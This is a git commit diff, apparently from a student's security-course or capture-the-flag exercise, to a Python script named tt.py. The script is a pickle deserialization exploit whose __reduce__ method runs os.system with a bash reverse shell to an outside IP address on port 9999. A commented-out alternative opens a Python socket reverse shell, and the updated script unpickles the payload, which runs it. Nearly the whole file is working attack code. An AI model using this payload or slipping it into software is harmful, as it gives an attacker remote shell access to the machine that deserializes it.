94e466b7f7921c400d42564db5cd7e6a3abe1509
jason2 <r07922115@ntu.edu.tw>
2019-12-03 20:22:37 +0800

    tinyurl update from labpc

--- 0x06/test/tt.py
+++ 0x06/test/tt.py
@@ -1,13 +1,15 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 import pickle
 import os
-class A(object):
+class shell(object):
     def __reduce__(self):
-        a = 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
-        return (os.system,(a,))    
-a=A()
-result = pickle.dumps(a)
+        a = """/bin/bash -c '/bin/bash -i >& /dev/tcp/140.112.90.54/9999 0>&1' """
+        # a = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+        return (os.system, (a,))    
+
+result = pickle.dumps(shell())
 print(result)
-with open('ser_obj', 'wb') as file:
-    file.write(bytearray(result))
-# pickle.loads(result)
+# with open('ser_obj', 'wb') as file:
+    # file.write(bytearray(result))
+
+pickle.loads(result)
